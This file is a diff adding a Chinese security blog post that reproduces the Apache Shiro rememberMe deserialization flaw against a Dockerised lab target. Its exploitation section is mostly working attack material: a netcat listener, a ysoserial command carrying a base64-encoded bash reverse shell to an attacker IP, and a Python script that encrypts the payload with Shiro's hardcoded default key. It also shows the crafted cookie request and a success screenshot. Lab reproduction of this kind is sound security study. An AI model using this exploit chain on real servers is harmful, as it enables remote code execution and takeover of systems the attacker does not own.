@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>shiro反序列化漏洞复现 - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta itemprop="name" content="shiro反序列化漏洞复现">
+<meta itemprop="description" content="框架简介 Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。(百度百科)
+漏洞原理 由于shiro使用rememberMe这个cookie字段对用户进行权限判断，为了防止出现越权问题，框架使用了CookieRemembreMeManager这个类，使用这个类对cookie中的rememberMe字段进行序列化，然后将其进行aes加密，最后使用base64对其编码，再返回给用户，由于shiro将aes的密钥硬编码在代码中，只要通过调试代码获取到了密钥进行解密，就可以使用ysoserial包进行反序列化操作，生成带有远程代码执行的rememberMe字段值进行漏洞利用。
+环境搭建 测试使用的环境是
+https://github.com/Medicean/VulApps/ 靶机地址和文件路径
+https://github.com/Medicean/VulApps/tree/master/s/shiro/1 VulApps/s/shiro/1 运行命令获取并启动靶机环境
+docker pull medicean/vulapps:s_shiro_1 docker run -d -p 80:8080 medicean/vulapps:s_shiro_1 使用命令查看靶机是否启动成功
+docker container ls 靶机启动成功，访问靶机，端口被映射成80，直接访问 http://xxx.xxx.xxx.xxx
+漏洞复现 利用代码执行反弹shell获取权限 开启nc进行监听
+nc -k -lvvp 8080 使用ysoserial生成相关payload 下载ysoserial
+https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar 运行命令建立监听端口和相关命令
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1443 CommonsCollections4 &#39;bash -c {echo,YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xMC4xMC4xMC4xMzUvODA4MCAwPiYx}|{base64,-d}|{bash,-i}&#39; 监听端口这里设置为1443，该端口可以随意设置 其中base64部分内容为
+bash -i &gt;&amp; /dev/tcp/10.10.10.135/8080 0&gt;&amp;1 其内容为需要shell反弹到的目的IP和端口，也就是上面运行nc监听的服务器和端口号 然后运行生成rememberMe字段的脚本工具
+import sys import uuid import base64 import subprocess from Crypto.Cipher import AES def encode_rememberme(command): popen = subprocess.">
+<meta itemprop="datePublished" content="2019-11-03T09:39:38&#43;08:00" />
+<meta itemprop="dateModified" content="2019-11-03T09:39:38&#43;08:00" />
+<meta itemprop="wordCount" content="180">
+
+
+
+<meta itemprop="keywords" content="漏洞复现," /><meta property="og:title" content="shiro反序列化漏洞复现" />
+<meta property="og:description" content="框架简介 Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。(百度百科)
+漏洞原理 由于shiro使用rememberMe这个cookie字段对用户进行权限判断，为了防止出现越权问题，框架使用了CookieRemembreMeManager这个类，使用这个类对cookie中的rememberMe字段进行序列化，然后将其进行aes加密，最后使用base64对其编码，再返回给用户，由于shiro将aes的密钥硬编码在代码中，只要通过调试代码获取到了密钥进行解密，就可以使用ysoserial包进行反序列化操作，生成带有远程代码执行的rememberMe字段值进行漏洞利用。
+环境搭建 测试使用的环境是
+https://github.com/Medicean/VulApps/ 靶机地址和文件路径
+https://github.com/Medicean/VulApps/tree/master/s/shiro/1 VulApps/s/shiro/1 运行命令获取并启动靶机环境
+docker pull medicean/vulapps:s_shiro_1 docker run -d -p 80:8080 medicean/vulapps:s_shiro_1 使用命令查看靶机是否启动成功
+docker container ls 靶机启动成功，访问靶机，端口被映射成80，直接访问 http://xxx.xxx.xxx.xxx
+漏洞复现 利用代码执行反弹shell获取权限 开启nc进行监听
+nc -k -lvvp 8080 使用ysoserial生成相关payload 下载ysoserial
+https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar 运行命令建立监听端口和相关命令
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1443 CommonsCollections4 &#39;bash -c {echo,YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xMC4xMC4xMC4xMzUvODA4MCAwPiYx}|{base64,-d}|{bash,-i}&#39; 监听端口这里设置为1443，该端口可以随意设置 其中base64部分内容为
+bash -i &gt;&amp; /dev/tcp/10.10.10.135/8080 0&gt;&amp;1 其内容为需要shell反弹到的目的IP和端口，也就是上面运行nc监听的服务器和端口号 然后运行生成rememberMe字段的脚本工具
+import sys import uuid import base64 import subprocess from Crypto.Cipher import AES def encode_rememberme(command): popen = subprocess." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vampire-lab.github.io/posts/my-first-blog/" />
+<meta property="article:published_time" content="2019-11-03T09:39:38+08:00" />
+<meta property="article:modified_time" content="2019-11-03T09:39:38+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="shiro反序列化漏洞复现"/>
+<meta name="twitter:description" content="框架简介 Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。(百度百科)
+漏洞原理 由于shiro使用rememberMe这个cookie字段对用户进行权限判断，为了防止出现越权问题，框架使用了CookieRemembreMeManager这个类，使用这个类对cookie中的rememberMe字段进行序列化，然后将其进行aes加密，最后使用base64对其编码，再返回给用户，由于shiro将aes的密钥硬编码在代码中，只要通过调试代码获取到了密钥进行解密，就可以使用ysoserial包进行反序列化操作，生成带有远程代码执行的rememberMe字段值进行漏洞利用。
+环境搭建 测试使用的环境是
+https://github.com/Medicean/VulApps/ 靶机地址和文件路径
+https://github.com/Medicean/VulApps/tree/master/s/shiro/1 VulApps/s/shiro/1 运行命令获取并启动靶机环境
+docker pull medicean/vulapps:s_shiro_1 docker run -d -p 80:8080 medicean/vulapps:s_shiro_1 使用命令查看靶机是否启动成功
+docker container ls 靶机启动成功，访问靶机，端口被映射成80，直接访问 http://xxx.xxx.xxx.xxx
+漏洞复现 利用代码执行反弹shell获取权限 开启nc进行监听
+nc -k -lvvp 8080 使用ysoserial生成相关payload 下载ysoserial
+https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar 运行命令建立监听端口和相关命令
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1443 CommonsCollections4 &#39;bash -c {echo,YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xMC4xMC4xMC4xMzUvODA4MCAwPiYx}|{base64,-d}|{bash,-i}&#39; 监听端口这里设置为1443，该端口可以随意设置 其中base64部分内容为
+bash -i &gt;&amp; /dev/tcp/10.10.10.135/8080 0&gt;&amp;1 其内容为需要shell反弹到的目的IP和端口，也就是上面运行nc监听的服务器和端口号 然后运行生成rememberMe字段的脚本工具
+import sys import uuid import base64 import subprocess from Crypto.Cipher import AES def encode_rememberme(command): popen = subprocess."/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />
+
+        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://vampire-lab.github.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://vampire-lab.github.io/">
+				<img src="/images/im/t.png" alt="Vampire blog" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
+	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
+		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">03</span>
+							<span class="rest">Nov 2019</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">shiro反序列化漏洞复现</h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<h3 id="框架简介">框架简介</h3>
+<p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。(百度百科)</p>
+<h3 id="漏洞原理">漏洞原理</h3>
+<p>由于shiro使用rememberMe这个cookie字段对用户进行权限判断，为了防止出现越权问题，框架使用了CookieRemembreMeManager这个类，使用这个类对cookie中的rememberMe字段进行序列化，然后将其进行aes加密，最后使用base64对其编码，再返回给用户，由于shiro将aes的密钥硬编码在代码中，只要通过调试代码获取到了密钥进行解密，就可以使用ysoserial包进行反序列化操作，生成带有远程代码执行的rememberMe字段值进行漏洞利用。</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p>测试使用的环境是</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://github.com/Medicean/VulApps/
+</code></pre></div><p>靶机地址和文件路径</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://github.com/Medicean/VulApps/tree/master/s/shiro/1
+
+VulApps/s/shiro/1
+</code></pre></div><p>运行命令获取并启动靶机环境</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">docker pull medicean/vulapps:s_shiro_1
+docker run -d -p 80:8080 medicean/vulapps:s_shiro_1
+</code></pre></div><p>使用命令查看靶机是否启动成功</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">docker container ls
+</code></pre></div><p><img src="/images/2019/shiro/b2470ca57aef9883006d3495acba60a3.png" alt="b2470ca57aef9883006d3495acba60a3.png"></p>
+<p>靶机启动成功，访问靶机，端口被映射成80，直接访问
+<a href="http://xxx.xxx.xxx.xxx">http://xxx.xxx.xxx.xxx</a></p>
+<p><img src="/images/2019/shiro/cddf5e9413f74d4cb6f749b7b127e268.png" alt="cddf5e9413f74d4cb6f749b7b127e268.png"></p>
+<h3 id="漏洞复现">漏洞复现</h3>
+<p>利用代码执行反弹shell获取权限
+开启nc进行监听</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nc -k -lvvp 8080
+</code></pre></div><p><img src="/images/2019/shiro/7d208bb8a52e498042f96421fc3b0834.png" alt="7d208bb8a52e498042f96421fc3b0834.png"></p>
+<p>使用ysoserial生成相关payload
+下载ysoserial</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
+</code></pre></div><p>运行命令建立监听端口和相关命令</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1443 CommonsCollections4 &#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMzUvODA4MCAwPiYx}|{base64,-d}|{bash,-i}&#39;
+</code></pre></div><p>监听端口这里设置为1443，该端口可以随意设置
+其中base64部分内容为</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">bash -i &gt;&amp; /dev/tcp/10.10.10.135/8080 0&gt;&amp;1
+</code></pre></div><p>其内容为需要shell反弹到的目的IP和端口，也就是上面运行nc监听的服务器和端口号
+<img src="/images/2019/shiro/ca1cfec35f117b3943f823cd9b7844ba.png" alt="ca1cfec35f117b3943f823cd9b7844ba.png"></p>
+<p>然后运行生成rememberMe字段的脚本工具</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import sys
+import uuid
+import base64
+import subprocess
+from Crypto.Cipher import AES
+
+def encode_rememberme(command):
+    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)
+    BS = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key = base64.b64decode(&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;)
+    #key = base64.b64decode(&#34;Z3VucwAAAAAAAAAAAAAAAA==&#34;)
+    iv = uuid.uuid4().bytes
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    file_body = pad(popen.stdout.read())
+    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+
+if __name__ == &#39;__main__&#39;:
+    payload = encode_rememberme(sys.argv[1])
+    print &#34;rememberMe={0}&#34;.format(payload.decode())
+</code></pre></div><p>该代码可能需要安装pycrypto模块</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">apt-get install python-dev
+pip install pycrypto
+</code></pre></div><p>将文件保存为 shiro_poc.py
+运行命令</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python shiro_poc.py 10.10.10.135:1443
+</code></pre></div><p>该ip和端口为ysoserial.jar监听时的端口和服务器地址
+生成rememberMe代码执行payload
+<img src="/images/2019/shiro/18a9fd2cfb09915138debe4a87bbd87b.png" alt="18a9fd2cfb09915138debe4a87bbd87b.png"></p>
+<p>将上述内容添加入到数据包cookie中，发送数据包</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">GET / HTTP/1.1
+Host: 10.10.10.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: CFADMIN_LASTPAGE_ADMIN=%2FCFIDE%2Fadministrator%2Fupdates%2Findex%2Ecfm; JSESSIONID=100483548247B8E84F5E5D8381CBDE4A; rememberMe=qmWq4GMJQsStsz3gbRBWAKRAxXfJ9ygzniLVQn7cuD4sa5b/Lfk50T+crRE0UQP3Jltq9p3XIe6bssHC41PngH5FvGAclBHe78aRRGZJAVSNEOzgGcfwK2flvy8kTRks89C+DcUOYS4cHn8z/W1RiCas0G6P3rQjTLWUZxjsGxmIzc+v3XjLha35IH+LEEjN7nwzdKWbZyuPOMzHS10XEwLem7b66rONGe8zI8KjOwq4oET+hzvNFPxgklPEL1pxGbxEipFH1C4dvcVQdHy+pwU1CMJ58siZ98XLTAZmJ7VGAqbYY1cLtnY0jOQY6FpAUFY2PWHo/yxoOmcU4LO/Z2eTiYaGCxjdOhgP439K5hflD7jTbtwDIa+mUOM7knoPCcbOaLxEE2rU1kH71vqVVA==
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+</code></pre></div><p><img src="/images/2019/shiro/b96849558cd824cec921c511ebe2df80.png" alt="b96849558cd824cec921c511ebe2df80.png"></p>
+<p>漏洞利用成功
+<img src="/images/2019/shiro/eb1ed4c2ca81de953eb9c7864b69f532.png" alt="eb1ed4c2ca81de953eb9c7864b69f532.png"></p>
+
+			</div>
+
+			<div class="tags">
+				
+					
+						<ul class="flat">
+							
+							<li><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li>
+							
+						</ul>
+					
+				
+			</div>
+
+
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div>2019  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
